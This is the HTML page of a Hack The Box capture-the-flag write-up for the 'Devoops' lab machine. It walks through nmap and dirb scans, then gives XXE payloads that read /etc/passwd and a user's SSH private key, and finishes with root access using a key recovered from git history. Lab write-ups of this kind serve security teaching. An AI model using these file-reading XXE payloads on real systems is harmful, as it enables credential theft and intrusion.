@@ -1,0 +1,998 @@
+<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+	
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
+      
+      
+        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Devoops Writeup/">
+      
+      
+        <meta name="author" content="Rushi Chaudhari">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+	<meta name="format-detection" content="telephone=no">
+
+    
+      
+        <title>6. Devoops Writeup.md - Hackthebox Solutions</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#009688">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../css/katex.css">
+    
+      <link rel="stylesheet" href="../../css/custom.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#nmap-results" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Hackthebox Solutions
+            </span>
+            <span class="md-header-nav__topic">
+              
+                6. Devoops Writeup.md
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    hackthebox-solutions.github.io
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Hackthebox Solutions
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    hackthebox-solutions.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Preface" class="md-nav__link">
+      Preface
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      I Retired
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        I Retired
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
+      1. Access Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
+      2. Jerry Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
+      3. Blue Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
+      4. Blocky Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
+      5. Calamity Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+    <a href="./" title="6. Devoops Writeup.md" class="md-nav__link md-nav__link--active">
+      6. Devoops Writeup.md
+    </a>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
+      7. Apocalyst Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
+      8. Poison Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
+      9. Postman Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
+      10. Beep Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
+      11. Help Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
+      12. Mirai Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
+      13. Curling Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
+      14. Nibbles Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
+      15. Valentine Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
+      16. Popcorn Writeups.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
+      17. Cronos Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
+      18. Legacy Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
+      19. Openadmin Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
+      20. Bank Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
+      21. Shocker Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
+      22. Luke Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
+      23. Arctic Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
+      24. Granny Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
+      25. Netmon Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
+      26. Sense Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
+      27. Sunday Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
+      28. Solidstate Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
+      29. Celestial Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
+      30. Tenten Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
+      31. Optimum Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
+      32. Haircut Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
+      33. Irked Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
+      34. Chatterbox Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
+      35. Bashed Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
+      36. Lame Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
+      37. Grandpa Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
+      38. Swagshop Writeup.md
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Devoops Writeup.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <p><img alt="" src="../../img/Devoops Writeup/1_fkakKw_J-QwKPEpuepLS8A.png" /></p>
+<p>The IP of this box is 10.10.10.91</p>
+<h4 id="nmap-results">NMAP Results</h4>
+<p>We begin with the NMAP Scan by the command <strong>nmap -sC -sV -oA devoops 10.10.10.91</strong></p>
+<blockquote>
+<h1 id="nmap-770-scan-initiated-wed-jun-6-023531-2018-as-nmap-sv-sv-oa-nmap-10101091">Nmap 7.70 scan initiated Wed Jun 6 02:35:31 2018 as: nmap -sV -sV -oA nmap 10.10.10.91</h1>
+<p>Nmap scan report for 10.10.10.91
+Host is up (0.19s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+5000/tcp open http Gunicorn 19.7.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
+</blockquote>
+<h1 id="nmap-done-at-wed-jun-6-023614-20181-ip-address-1-host-up-scanned-in-4271-seconds">Nmap done at Wed Jun 6 02:36:14 2018–1 IP address (1 host up) scanned in 42.71 seconds</h1>
+<p>As we see the 2 ports are open ,i.e, Port 22 running <strong>SSH</strong> and Port 5000 running<strong> http</strong></p>
+<p><strong>HTTP Services</strong></p>
+<p>Now as we see http service running on port 5000 , we open this IP 10.10.10.91:5000 on a web browser and check the web application running</p>
+<p><img alt="http://10.10.10.91:5000" src="https://cdn-images-1.medium.com/max/2672/1*TQMaNT8xh2uY6q0qVdSVuQ.png" /></p>
+<p>Here we see nothing interesting , lets run dirb on it</p>
+<h4 id="dirb">Dirb</h4>
+<p>Now we run our dirb scan</p>
+<p><img alt="dirb" src="../../img/Devoops Writeup/1__RXjJvVPBMLyEzmFzI-Bnw.png" /></p>
+<p>Dirb result shows two subdirectories , <strong>/feed</strong> and <strong>/upload</strong></p>
+<blockquote>
+<p>If you face issues running dirb , it might be due to blocked USER-AGENT or something</p>
+<p>Use dirsearch tool (download from Github) which has additional parameter “-random-agents”</p>
+</blockquote>
+<h4 id="feed">/feed</h4>
+<p>We try to access <a href="http://10.10.10.91:5000/feed">http://10.10.10.91:5000/feed</a> , we get</p>
+<p><img alt="/feed" src="../../img/Devoops Writeup/1_8SPvWwce4J1znvT02Q504g.png" /></p>
+<p>Nothing interesting in <strong>/feed</strong> , so we move to <strong>/upload</strong></p>
+<h4 id="upload">/upload</h4>
+<p>Now we try to access <a href="http://10.10.10.91:5000/upload">http://10.10.10.91:5000/upload</a></p>
+<p><img alt="/upload" src="../../img/Devoops Writeup/1_edMZS_xvLS5-HgvFBAosBA.png" /></p>
+<p>Here we see we can upload some files , at first I thought it might have file upload vulnerability , so I uploaded a random photo file(.png , .jpeg or anything) and I get</p>
+<p><img alt="Upload doesn’t work" src="../../img/Devoops Writeup/1_23yDzP6XYYX-I_fFwwQ5SQ.png" /></p>
+<p>And as we choose file and then click on the Upload button , it doesn't gets upload</p>
+<p>As we see there is something written as XML elements: Author, Subject , Content , which strikes directly to XXE Injection , so we give it a try</p>
+<h4 id="xxe-injection">XXE Injection</h4>
+<p>For more details on XXE , refer to OWASP TOP 10</p>
+<p>Below is the code which we will use to exploit the XXE</p>
+<blockquote>
+<p>&lt;?xml version=”1.0" encoding=”ISO-8859–1"?&gt;</p>
+</blockquote>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM “file:///etc/passwd” >]>
+<creds>
+ <Author>&xxe;</Author>
+ <Subject>mysub</Subject>
+ <Content>mycontent</Content>
+</creds>
+
+<blockquote>
+<p>&lt;! — We have edited <user> and <pass>(as referenced in the link of the XXE code) to <Author> , <Subject> , <Content> as we
+clearly see that in the /upload directory says XML Elements: Author, Subject, Content which is a clear indication to use this
+as the XML tags →</p>
+</blockquote>
+<p><strong>Result of the above XXE Code</strong></p>
+<p>We intercept the traffic through Burp and see the results</p>
+<p><img alt="Uploading our XML File (../img/Devoops Writeup/1_WsXop5byvRdsdN7inqiB7Q.png)" src="https://cdn-images-1.medium.com/max/1074/1*WsXop5byvRdsdN7inqiB7Q.png" /></p>
+<p>After choosing the exploit.xml file which contains the XXE Injection code , we click on Upload and intercept its traffic through Burp Suite and then send the request to Repeater</p>
+<p><img alt="Burp Interception" src="../../img/Devoops Writeup/1_zeDhv4JCsO7pB2ugp9RT3w.png" /></p>
+<p>Sending this to Repeater and clicking Go , we get</p>
+<p><img alt="Burp Repeater" src="../../img/Devoops Writeup/1_AmeDX5ZtvSvL9xXVqE3njg.png" /></p>
+<p>Boom , we get the contents of the /etc/passwd file as we gave in the code above , now lets check the users from the contents of the /etc/passwd file</p>
+<p><img alt="/etc/passwd" src="../../img/Devoops Writeup/1_upQK1QDbJORwt2n5Q8FRWg.png" /></p>
+<p>As we see there is an user name <strong><em>“roosa”</em></strong></p>
+<p>Now we will get the ssh authentication key of the roosa user as we know from the NMAP scan that SSH is open</p>
+<p>Below is the XML Code to get the ssh authentication key for <strong>“roosa”</strong> user</p>
+<blockquote>
+<p>&lt;?xml version=”1.0" encoding=”ISO-8859–1"?&gt;</p>
+</blockquote>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM “file:///home/roosa/.ssh/id_rsa” >]>
+<creds>
+ <Author>&xxe;</Author>
+ <Subject>mysub</Subject>
+ <Content>mycontent</Content>
+</creds>
+
+<blockquote>
+<p>&lt;! — We just replaced /etc/passwd from the previous code by /home/roosa/.ssh/id_rsa →</p>
+</blockquote>
+<p>Now we just modify the code in the Burp Repeater and click Go</p>
+<p><img alt="Getting SSH Key" src="../../img/Devoops Writeup/1_Uc5HoNpGuan6IGWcahd3Eg.png" /></p>
+<p>Here we get the ssh in the response body , now we copy the part from — — — — BEGIN to — — — — END RSA….. and save it to a file named <strong><em>“id_rsa”</em></strong></p>
+<p>But yeah change the permission of <strong>id_rsa</strong> file to <strong>600</strong> using <strong>“chmod 600 id_rsa”</strong></p>
+<h4 id="login-through-ssh">Login Through SSH</h4>
+<blockquote>
+<p>Now we open a terminal and connect through ssh using command <strong>“ssh roosa@10.10.10.91 -i id_rsa”</strong></p>
+</blockquote>
+<p><img alt="SSH Connection Successful" src="../../img/Devoops Writeup/1_OIhZp5i8nqSGKhef5xvnrQ.png" /></p>
+<p>Boom !!! We are in , now lets dig further</p>
+<h4 id="getting-user-flag">Getting User Flag</h4>
+<p>The user flag was in the same directory to which we were login through ssh , just type the command <strong><em>ls</em></strong> and you will see</p>
+<p><img alt="user.txt" src="../../img/Devoops Writeup/1_tSoZVRQ0Psdl2yBVJVlFRg.png" /></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Privilege Escalation was little tough and tricky on this machine , so lets move forward to it</p>
+<h4 id="searching-and-searching-for-some-clues">Searching and searching for some clues</h4>
+<p>There was a script on the directory , which is a in the SS below</p>
+<p><img alt="run-blogfeed.sh" src="../../img/Devoops Writeup/1_m501Lf9uU6Vzq9ciDz5hzg.png" /></p>
+<p>After searching more , this wasn't useful, but yeah then we saw 2 directories which was odd , i.e , <strong>work </strong>and <strong>deploy</strong></p>
+<p><img alt="" src="../../img/Devoops Writeup/1_NnAdhZpvQJPlpPdGXd3iTQ.png" /></p>
+<p>We got a .git folder , so lets try the git log command on it and see the results</p>
+<h4 id="git-log">Git Log</h4>
+<p>Now running <strong><em>“git log</em></strong>” command on the .git folder , we get</p>
+<p><img alt="Git Log" src="../../img/Devoops Writeup/1_XPAjsSMDMVkokEbsNR-otA.png" /></p>
+<p>Here we dont get anything interesting , lets check further by <strong><em>“git log -r”</em></strong> command and scroll down , we get</p>
+<p><img alt="git log -r" src="../../img/Devoops Writeup/1_scPEDUGdz9Ed2sDyt4P8LA.png" /></p>
+<p>It says <strong><em>“reverted accidental commit with proper key”</em></strong> which was the hint , so after googling about <strong>“git revert”</strong> and more like that , i got that using
+the command<strong> “git log -p -6”</strong> , so lets run this command and then check the results</p>
+<p><img alt="" src="../../img/Devoops Writeup/1_YgHm6Tgm1iYA3vPGdY4nGQ.png" /></p>
+<p>After scrolling down and down , we see something like ssh keys , one of them in<strong> green</strong> color and one of them in <strong>red</strong></p>
+<p>The <strong><em>red</em></strong> one was the old which was reverted accidentally to the new one(which is in <strong><em>green</em></strong> color)</p>
+<p>So lets copy the red section and then save it to a file name <strong><em>“id_rsa2”</em></strong> , this is probably the ssh key to root</p>
+<p>Don’t forget to change the permissions of the <strong>id_rsa2 file</strong> to <strong>600</strong> using <strong>chmod</strong></p>
+<h4 id="login-to-root-through-ssh">Login To Root Through SSH</h4>
+<p>Now we login to root using ssh , use the command <strong><em>“ssh root@10.10.10.91 -i id_rsa2”</em></strong></p>
+<p><img alt="SSH to Root" src="../../img/Devoops Writeup/1_bcXsqU8pIqgM-4b-Wf3wJA.png" /></p>
+<p>We are now root , bingo.!!</p>
+<h4 id="getting-the-root-flag">Getting The Root Flag</h4>
+<p>Now getting the root flag which is on the same directory to which we were logged</p>
+<p><img alt="root.txt" src="../../img/Devoops Writeup/1_Hbbtnjedcur0E0iE0bIbxA.png" /></p>
+<p>This machine was very cool , getting user was easy but root was very tough for me</p>
+<h4 id="vulnerabilities-used-to-solve-this-box-">Vulnerabilities Used To Solve This Box :-</h4>
+<blockquote>
+<p>XXE Injection → Low Privileges</p>
+<p>Git → Root Privileges</p>
+</blockquote>
+<h1 id="references">References</h1>
+<p>XXE Injection Exploitation → <a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</a></p>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                5. Calamity Writeup.md
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                7. Apocalyst Writeup.md
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
+    
+      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
+    
+      <a href="" class="md-footer-social__link fa fa-"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.808e90bb.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../js/katex.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
